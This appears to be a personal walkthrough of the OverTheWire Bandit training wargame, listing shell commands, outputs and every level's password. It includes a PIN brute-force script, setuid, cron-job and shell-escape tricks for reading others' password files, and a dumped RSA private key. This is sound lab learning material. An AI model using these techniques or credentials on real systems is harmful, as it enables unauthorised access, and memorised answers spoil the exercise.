0. using ssh to login
`ssh bandit.labs.overthewire.org -l bandit0 -p 2220`

1. password finding:
boJ9jbbUNNfktd78OOpsqOltutMc3MY1

2. opening a file named "-"
we need to use fill location ./-

special character reference in cmd - 
http://tldp.org/LDP/abs/html/special-chars.html

bandit1@bandit:~$ cat ./-
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9

3. 
bandit2@bandit:~$ cat "spaces in this filename"
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK

4. bandit3@bandit:~/inhere$ ls -a
.  ..  .hidden
bandit3@bandit:~/inhere$ cat .hidden
pIwrPrtPN36QITSp3EQaw936yaFoFgAB

5. bandit4@bandit:~/inhere$ file ./-file*
./-file00: data
./-file01: data
./-file02: data
./-file03: data
./-file04: data
./-file05: data
./-file06: data
./-file07: ASCII text
./-file08: data
./-file09: data
bandit4@bandit:~/inhere$ cat "./-file07"
koReBOKuIDDepwhWk7jZC0RTdopnAYKh

6. 
bandit5@bandit:~/inhere$ find ./ -type f -readable ! -executable -size 1033c
./maybehere07/.file2
bandit5@bandit:~/inhere$ cat ./maybehere07/.file2
DXjZPULLxYr17uwoI01bNLQbtFemEgo7 

7. bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c -type f 2>/dev/null
/var/lib/dpkg/info/bandit7.password
bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password 
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs

8. bandit7@bandit:~$ cat data.txt | grep millionth
millionth	cvX2JJa4CFALtqS87jk27qwqGhBM9plV

9. https://linux.die.net/abs-guide/textproc.html
bandit8@bandit:~$ sort data.txt | uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR

also possible:  sort data.txt | uniq -c | grep1

10. 
bandit9@bandit:~$ cat data.txt | grep ==
Binary file (standard input) matches

This is returned due to : Presumably the file .bash_history starts with non-text data, hence grep is treating the file as binary.

to match in binary file:
cat data.txt | grep "=" --binary-files=text

bandit9@bandit:~$ strings data.txt | grep '='
========== the*2i"4
=:G e
========== password
<I=zsGi
Z)========== is
A=|t&E
Zdb=
c^ LAh=3G
*SF=s
&========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk

10. bandit10@bandit:~$ cat data.txt | base64 --decode
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR

11. used rotation.py

python3 rotation.py Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh
input:  Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu

alternatively,
bandit11@bandit:~$ cat data.txt | rot13
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu

12. 
converting hexdump to reverse hex dump :
cat data.txt | xxd -r > data
Requires multiple compression and decompression
tar xf data6.tar
gzip -d data8.gz
bzip2 -d data6.bz

bandit12@bandit:/tmp/ashwin$ cat data8
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL

13. 
https://help.ubuntu.com/community/SSH/OpenSSH/Keys

 The private key is kept on the computer you log in from, while the public key is stored on the .ssh/authorized_keys file on all the computers you want to log in to.

gives the private key of bandit14
this can be used with
sshkey.private > deployment.txt
root@root:~# chmod 600 deployment.txt
root@root:~# ssh -i deployment.txt bandit14@bandit.labs.overthewire.org -p 2220

14.  
bandit14 has password for bandit15.
so find it at 

bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e

bandit14@bandit:~$ echo 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e | nc localhost 30000
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr

15. 
openssl s_client -connect localhost:30001
CONNECTED(00000003)
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify return:1
---
Certificate chain
 0 s:/CN=localhost
   i:/CN=localhost
---
Server certificate
-----BEGIN CERTIFICATE-----
MIICBjCCAW+gAwIBAgIEDU18oTANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls
b2NhbGhvc3QwHhcNMjAwNTA3MTgxNTQzWhcNMjEwNTA3MTgxNTQzWjAUMRIwEAYD
VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAK3CPNFR
FEypcqUa8NslmIMWl9xq53Cwhs/fvYHAvauyfE3uDVyyX79Z34Tkot6YflAoufnS
+puh2Kgq7aDaF+xhE+FPcz1JE0C2bflGfEtx4l3qy79SRpLiZ7eio8NPasvduG5e
pkuHefwI4c7GS6Y7OTz/6IpxqXBzv3c+x93TAgMBAAGjZTBjMBQGA1UdEQQNMAuC
CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0
ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3
DQEBBQUAA4GBAC9uy1rF2U/OSBXbQJYuPuzT5mYwcjEEV0XwyiX1MFZbKUlyFZUw
rq+P1HfFp+BSODtk6tHM9bTz+p2OJRXuELG0ly8+Nf/hO/mYS1i5Ekzv4PL9hO8q
PfmDXTHs23Tc7ctLqPRj4/4qxw6RF4SM+uxkAuHgT/NDW1LphxkJlKGn
-----END CERTIFICATE-----
subject=/CN=localhost
issuer=/CN=localhost
---
No client certificate CA names sent
Peer signing digest: SHA512
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 1019 bytes and written 269 bytes
Verification error: self signed certificate
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Server public key is 1024 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
    Session-ID: 3F0D7D58312874D74A7C9AA1F5D89BB8120644AAD17160421524E01E9F3F9C29
    Session-ID-ctx: 
    Master-Key: 3595399ED3182C584EA758E272542F8B4C190A1235E7670F1E309F8FE9B4AD7FEDD9850E62138445F216A0D5BACBCAAE
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - aa 02 e6 3a 2e 0b c8 5d-6f 54 4a 1b 5a e0 2c 0e   ...:...]oTJ.Z.,.
    0010 - a5 81 cf 93 f2 7c a7 32-0c ea 72 21 7e 0e 01 ff   .....|.2..r!~...
    0020 - 9e 15 42 d4 f0 00 6f df-ab a9 84 d7 3c a8 44 2f   ..B...o.....<.D/
    0030 - 45 08 9b e7 f5 6d 59 57-8e 46 e5 b0 70 8d 4a 7a   E....mYW.F..p.Jz
    0040 - 04 99 db a8 d7 22 ac 73-a2 80 92 42 72 29 c6 20   .....".s...Br). 
    0050 - f4 06 e6 2e 43 fa 96 ae-19 9f 18 3d 00 ee c4 99   ....C......=....
    0060 - bc c4 b0 a5 7d 71 cc 9a-4e a9 bf ad 60 51 a9 aa   ....}q..N...`Q..
    0070 - d5 79 9a e8 b1 8a 21 c6-26 20 26 81 88 88 b8 7e   .y....!.& &....~
    0080 - 09 ac 1b d9 37 a9 75 d8-26 b4 65 28 0e c6 4b aa   ....7.u.&.e(..K.
    0090 - 45 68 43 bc a1 b8 7a 03-f2 02 00 ea 9a a3 55 cb   EhC...z.......U.

    Start Time: 1593082327
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
    Extended master secret: yes
---
BfMYroe26WYalil77FoDi9qh59eK5xNr <-- entered
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd

closed

16. 
nmap -p 31000-32000 localhost -A

bandit16@bandit:~$ echo "cluFn7wTiGryunymYOu4RcffSxQluehd" | openssl s_client -connect localhost:31790 -ign_eof
CONNECTED(00000003)
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify return:1
---
Certificate chain
 0 s:/CN=localhost
   i:/CN=localhost
---
Server certificate
-----BEGIN CERTIFICATE-----
MIICBjCCAW+gAwIBAgIEUnONgjANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls
b2NhbGhvc3QwHhcNMjAwNTE0MTIwMzM4WhcNMjEwNTE0MTIwMzM4WjAUMRIwEAYD
VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBALOw+M6/
qSBJExGueg6T0HQRqfr80ysnqbuIAeQJ3VOwXg3BB8u7HtlA6JUrvQy66TWw5szi
uLBAyCffNHMx7Y2DF6L2vdSTxoOuDTLynRj7Xrw4f39NbgezfpfPbOd7/m3qNpcG
766Y46MT8w8j144VKK6qWhkBl9CPy8E2/frdAgMBAAGjZTBjMBQGA1UdEQQNMAuC
CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0
ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3
DQEBBQUAA4GBAEj2rWLwLHxQMk8uuUTFHnXrtnpXP3GDch8zdUbiln4chTISKG9O
akG/gohigTEo9V3PupKcaO/zXqAbuB6iaJxOEezuLEmoGAMThHqeXusLNEPtYl5N
nM/qYplbcQtOqvYYODdP9N5dQFa54xkNmkP7oPiQkOFFKIucVzpxwzuo
-----END CERTIFICATE-----
subject=/CN=localhost
issuer=/CN=localhost
---
No client certificate CA names sent
Peer signing digest: SHA512
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 1019 bytes and written 269 bytes
Verification error: self signed certificate
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Server public key is 1024 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
    Session-ID: 476CB6A8D378124B850154BF6AAEE29D3E14DCB17BE6030F584B29B29E7B895A
    Session-ID-ctx: 
    Master-Key: DEC7B355DA6E280FE47B16800555DBC1DB2C5D8568FCB08CD2F4AC31892B1CF7D9312F82EBEFE7CC0CA4758E0A634E93
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 15 f8 3e c0 71 51 2c d3-79 e7 dc 31 91 05 ba 3b   ..>.qQ,.y..1...;
    0010 - fb 50 e8 49 aa 9c 1a 9e-cb cc a7 9e ea 97 03 c9   .P.I............
    0020 - ae 27 7b c4 f0 1e 46 30-49 3e eb 47 66 98 04 d2   .'{...F0I>.Gf...
    0030 - 7f f3 b0 b0 be 8d 27 88-82 74 55 95 35 dd b6 8c   ......'..tU.5...
    0040 - e8 32 1f 39 46 2e 0d 30-57 a9 7f fd 46 90 f6 58   .2.9F..0W...F..X
    0050 - 24 32 2c 7d 15 f5 b3 47-1e 69 92 0b 47 a1 aa 14   $2,}...G.i..G...
    0060 - b2 f7 9b 64 45 b9 cd 44-a3 88 79 02 a0 f2 bb 60   ...dE..D..y....`
    0070 - f7 71 6b ac 24 58 cc 35-b6 dd 52 c6 7b 2f 0c e0   .qk.$X.5..R.{/..
    0080 - 5b 9f 3b 81 79 70 05 35-90 d9 4a 2e 72 7a 08 48   [.;.yp.5..J.rz.H
    0090 - ee 12 20 a1 06 3e 60 b9-27 2b 29 7e f2 cf d7 8e   .. ..>`.'+)~....

    Start Time: 1593084167
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
    Extended master secret: yes
---
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

closed

17. 
bandit17@bandit:~$ diff passwords.old passwords.new
42c42
< w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii
---
> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd

18. 
ssh was loggin us out as we logged in, 
so we ahd to give the command as we logged in.
root@root:~# ssh bandit.labs.overthewire.org -l bandit18 -p 2220 "cat ~/readme"
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit18@bandit.labs.overthewire.org's password: 
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x

19. 
bandit20:x:11020:11020:bandit level 20:/home/bandit20:/bin/bash

The setuid reference : https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits

The setuid bit simply indicates that when running the executable, it will set its permissions to that of the user who created it (owner), instead of setting it to the user who launched it

To locate the setuid, look for an ‘s’ instead of an ‘x’ in the executable bit of the file permissions.

the file permissions can be viewed bt ls -l filename

/etc/passwd - to find the password in the system.

bandit19@bandit:~$ ./bandit20-do id
uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)

bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j

20. 

bandit20@bandit:~$ echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l localhost -p 61337 &
[1] 10610
bandit20@bandit:~$ ps -aux                                                      USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
bandit20  9548  0.0  0.1  21148  5040 pts/46   Ss   06:08   0:00 -bash
bandit20  9742  0.0  0.0  27700  2808 pts/46   S+   06:09   0:00 screen
bandit20  9743  0.0  0.0  27852  2540 ?        Ss   06:09   0:00 SCREEN
bandit20  9744  0.0  0.1  21184  4964 pts/18   Ss   06:09   0:00 /bin/bash
bandit20 10610  0.0  0.0   6300  1696 pts/18   S    06:12   0:00 nc -l localhost
bandit20 10910  0.0  0.0  19188  2476 pts/18   R+   06:13   0:00 ps -aux
bandit20 23755  0.0  0.0   4180   644 ?        S    05:13   0:00 nc -l 2333
bandit20@bandit:~$ ./suconnect 61337
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
[1]+  Done                    echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l localhost -p 61337

21. 
cronjob is the scheduler used in linux

bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
     
bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI

22. 

bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget

bandit22@bandit:~$ myname=bandit23
bandit22@bandit:~$ echo I am user $myname | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

23. 
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mkdir -p /tmp/secttp
bandit23@bandit:~$ cd /tmp/secttp
bandit23@bandit:/tmp/secttp$ touch secttp.sh
bandit23@bandit:/tmp/secttp$ chmod 777 secttp.sh
bandit23@bandit:/tmp/secttp$ ls -al secttp.sh
-rwxrwxrwx 1 bandit23 bandit23 66 Jun 29 07:39 secttp.sh

andit23@bandit:/tmp/secttp$ vim sectp.sh
bandit23@bandit:/tmp/secttp$ touch password
bandit23@bandit:/tmp/secttp$ chmod 666 password
bandit23@bandit:/tmp/secttp$ ls -al password
-rw-rw-rw- 1 bandit23 bandit23 33 Jun 29 07:42 password
bandit23@bandit:/tmp/secttp$ cp sectp.sh /var/spool/bandit24/

bandit23@bandit:/tmp/secttp$ ls -al password
-rw-rw-rw- 1 bandit23 bandit23 33 Jun 29 07:42 password
bandit23@bandit:/tmp/secttp$ cat password
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 2647

24. 
nedded to do a brute force attack

nc localhost 30002 

followed by previous password and 4 digit pin

so the python program we made:
#!/usr/bin/env python3
# coding: utf-8import sys
import socketpincode = 0
password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"try:
    # Connect to server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 30002))
    
    # Print welcome message
    welcome_msg = s.recv(2048)
    print(welcome_msg)    # Try brute-forcing
    while pincode < 10000:
        pincode_string = str(pincode).zfill(4)
        message=password+" "+pincode_string+"\n"        # Send message
        s.sendall(message.encode())
        receive_msg = s.recv(1024)        # Check result
        if "Wrong" in receive_msg:
            print("Wrong PINCODE: %s" % pincode_string)
        else:
            print(receive_msg)
            break
        pincode += 1
finally:
    sys.exit(1)

Wrong PINCODE: 2584
Wrong PINCODE: 2585
Wrong PINCODE: 2586
Wrong PINCODE: 2587
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

25. 

The trick was in the more text file where you had to 
change the file tha was being view in more by pressing v then inseting location /etc/badnit_pass/bandit26 
 _   __                             
~/text.txt[RO] [dec= 95] [hex=5F] [pos=0001:0003][16% of 6]              
-- INSERT -- W10: Warning: Changing a readonly file
E325: ATTENTION
/tmp/text.txt.swp"
          owned by: bandit14   dated: Mon Jun 22 13:20:59 2020
         [cannot be opened]
While opening file "text.txt"
             dated: Thu May  7 20:14:45 2020

(2) An edit session for this file crashed.
    If this is the case, use ":recover" or "vim -r text.txt"
    If you did this already, delete the swap file "/tmp/text.txt.swp"
  1 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z                                     
<c/bandit_pass/bandit26[RO] [dec= 53] [hex=35] [pos=0001:0001][100% of 1]
"/etc/bandit_pass/bandit26" [readonly] 1L, 33C

26. 

reduce te size of the window so that more can be utilised
pressing v we find that by adding :set shell=/bin/bash
and typing :shell

bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
3ba3118a22e93127a4ed485be72ef5ea

27. 

git clone ssh://bandit27-git@localhost/home/bandit27-git/repo

we had to make a tmp folder 
and in that tmp folder we had to clone the repository

bandit27@bandit:/tmp/gitclone/repo$ cat README 
The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2

28. THis level had a similar challenge so we cloned it
in level 27 and found that

bandit27@bandit:/tmp/gitclone$ cat repo/README.md 
bandit28@bandit:/tmp/gitclone28$ cat repo/README.md 
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: xxxxxxxxxx

We can use git log to find what was changed in the network

bandit28@bandit:/tmp/gitclone28$ cd repo
bandit28@bandit:/tmp/gitclone28/repo$ git log
commit edd935d60906b33f0619605abd1689808ccdd5ee
Author: Morla Porla <morla@overthewire.org>
Date:   Thu May 7 20:14:49 2020 +0200

    fix info leak

commit c086d11a00c0648d095d04c089786efef5e01264
Author: Morla Porla <morla@overthewire.org>
Date:   Thu May 7 20:14:49 2020 +0200

    add missing data

commit de2ebe2d5fd1598cd547f4d56247e053be3fdc38
Author: Ben Dover <noone@overthewire.org>
Date:   Thu May 7 20:14:49 2020 +0200

    initial commit of README.md
bandit28@bandit:/tmp/gitclone28/repo$ git log -p
commit edd935d60906b33f0619605abd1689808ccdd5ee
Author: Morla Porla <morla@overthewire.org>
Date:   Thu May 7 20:14:49 2020 +0200

    fix info leak

diff --git a/README.md b/README.md
index 3f7cee8..5c6457b 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials
 
 - username: bandit29
-- password: bbc96594b4e001778eee9975372716b2
+- password: xxxxxxxxxx
 

commit c086d11a00c0648d095d04c089786efef5e01264
Author: Morla Porla <morla@overthewire.org>
Date:   Thu May 7 20:14:49 2020 +0200

    add missing data

diff --git a/README.md b/README.md
index 7ba2d2f..3f7cee8 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials
 
 - username: bandit29
:

29. 

since we didnt find any password in production branch so we switched over to teh dev branch and then enumerated the log to get the key

bandit28@bandit:/tmp/gitclone28/repo$ cat README.md 
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: <no passwords in production!>

so we check for branches in production

bandit28@bandit:/tmp/gitclone28/repo$ git branch
* master
bandit28@bandit:/tmp/gitclone28/repo$ git branch -r
  origin/HEAD -> origin/master
  origin/dev
  origin/master
  origin/sploits-dev
bandit28@bandit:/tmp/gitclone28/repo$ git checkout dev
Branch dev set up to track remote branch dev from origin.
Switched to a new branch 'dev'

bandit28@bandit:/tmp/gitclone28/repo$ git branch
* dev
  master

bandit28@bandit:/tmp/gitclone28/repo$ git log -p 
commit bc833286fca18a3948aec989f7025e23ffc16c07
Author: Morla Porla <morla@overthewire.org>
Date:   Thu May 7 20:14:52 2020 +0200

    add data needed for development

diff --git a/README.md b/README.md
index 1af21d3..39b87a8 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for bandit30 of bandit.
 ## credentials
 
 - username: bandit30
-- password: <no passwords in production!>
+- password: 5b90576bedb2cc04c86a9e924ce42faf
 

commit 8e6c203f885bd4cd77602f8b9a9ea479929ffa57
Author: Ben Dover <noone@overthewire.org>
Date:   Thu May 7 20:14:51 2020 +0200

    add gif2ascii

diff --git a/code/gif2ascii.py b/code/gif2ascii.py
new file mode 100644
index 0000000..8b13789
--- /dev/null
+++ b/code/gif2ascii.py
@@ -0,0 +1 @@
+

30. 
bandit28@bandit:/tmp/gitclone28/repo$ cat README.md 
just an epmty file... muahaha

bandit28@bandit:/tmp/gitclone28/repo$ git log -p
commit 3aefa229469b7ba1cc08203e5d8fa299354c496b
Author: Ben Dover <noone@overthewire.org>
Date:   Thu May 7 20:14:54 2020 +0200

    initial commit of README.md

diff --git a/README.md b/README.md
new file mode 100644
index 0000000..029ba42
--- /dev/null
+++ b/README.md
@@ -0,0 +1 @@
+just an epmty file... muahaha

bandit28@bandit:/tmp/gitclone28/repo$ git branch
* master
bandit28@bandit:/tmp/gitclone28/repo$ git branch -r
  origin/HEAD -> origin/master
  origin/master

git tagging the ability to tag specific points in a repository history

bandit28@bandit:/tmp/gitclone28/repo$ git tag
secret
bandit28@bandit:/tmp/gitclone28/repo$ git show secret
47e603bb428404d265f59c42920d81e5

31. 

bandit28@bandit:/tmp/gitclone28/repo$ cat README.md 
This time your task is to push a file to the remote repository.

Details:
    File name: key.txt
    Content: 'May I come in?'
    Branch: master

bandit28@bandit:/tmp/gitclone28/repo$ git log -p
commit 701b33b545902a670a46088731949ae040983d80
Author: Ben Dover <noone@overthewire.org>
Date:   Thu May 7 20:14:56 2020 +0200

    initial commit

diff --git a/.gitignore b/.gitignore
new file mode 100644
index 0000000..2211df6
--- /dev/null
+++ b/.gitignore
@@ -0,0 +1 @@
+*.txt
diff --git a/README.md b/README.md
new file mode 100644
index 0000000..0edecc0
--- /dev/null
+++ b/README.md
@@ -0,0 +1,7 @@
+This time your task is to push a file to the remote repository.
+
+Details:
+    File name: key.txt
+    Content: 'May I come in?'
+    Branch: master
+

Okay so we need to push a file in
After removing gitignore

bandit31-git@localhost's password: 
Counting objects: 6, done.
Delta compression using up to 2 threads.
Compressing objects: 100% (4/4), done.
Writing objects: 100% (6/6), 548 bytes | 0 bytes/s, done.
Total 6 (delta 1), reused 0 (delta 0)
remote: ### Attempting to validate files... ####
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote: 
remote: Well done! Here is the password for the next level:
remote: 56a9bf19c63d650ce78e6ec0354ee45e
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote: 
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote: 
remote: Wrong!
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote: 
To ssh://localhost/home/bandit31-git/repo
 ! [remote rejected] master -> master (pre-receive hook declined)
error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'

32. 

getting outof an interactive shell

>> $0
$ pwd
/home/bandit32
$ cat /etc/bandit_pass/bandit33
c9c3199ddf4121b10cf581a98d51caee

33. 

cat README.txt

Congratulations on solving the last level of this game!

At this moment, there are no more levels to play in this game. However, we are constantly working
on new levels and will most likely expand this game with more levels soon.
Keep an eye out for an announcement on our usual communication channels!
In the meantime, you could play some of our other wargames.

If you have an idea for an awesome new level, please let us know!
